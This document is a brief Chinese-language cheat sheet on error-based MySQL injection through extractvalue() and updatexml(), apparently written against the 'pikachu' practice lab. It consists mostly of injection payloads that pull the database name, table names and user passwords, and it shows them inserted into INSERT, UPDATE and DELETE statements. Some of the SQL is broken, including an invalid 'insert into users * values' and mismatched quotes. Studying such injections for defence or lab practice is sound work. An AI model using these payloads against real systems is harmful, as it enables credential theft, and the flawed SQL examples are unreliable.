# extractvalue() 和 updatexml()报错注入

使用基于函数的报错注入，函数会执行，并将结果返和错误信息一起返回

使用concat将字符串拼接，防止错误信息显示不全

```
' and updatexml(1,concat('!',database()),1)#
```

```
' and extractvalue(1,concat('!',database()))#
```

当结合查询语句是，使用括号，==使用查询时只能包含一列字段结果只能有一行==

```
' and updatexml(1,concat('!',(select table_name from information_schema.tables where table_schema='pikachu' limit 1)),1)#
```

```
' and extractvalue(1,concat('!',(select password from users limit 1)))#
```

## 结合insert或update报错注入

### insert

正常的SQL

```
insert into users * values('zs','toor',1,119)
```

使用payload`'or extractvalue(1,concat('!',(select password from users limit 1)))or '`

```
insert into users * values('zs','or extractvalue(1,concat('!',(select password from users limit 1)))or ',''，'')
```

### update

正常SQL

```
update users set name='zsf', password='fsz' where name='zs'
```

使用payload`' or extractvalue(1,concat('!',(select password from users limit 1))) or '`

```
update users set name='zsf',password='' or extractvalue(1,concat('!',(select password from users limit 1))) or '' where name='zs'
```

### delete

正常SQL

```
delete from users where id = 1
```

使用payload`or extractvalue(1,concat('!',(select password from users limit 1)))`

```
delete from users where id = 1 or extractvalue(1,concat('!',(select password from users limit 1)))
```

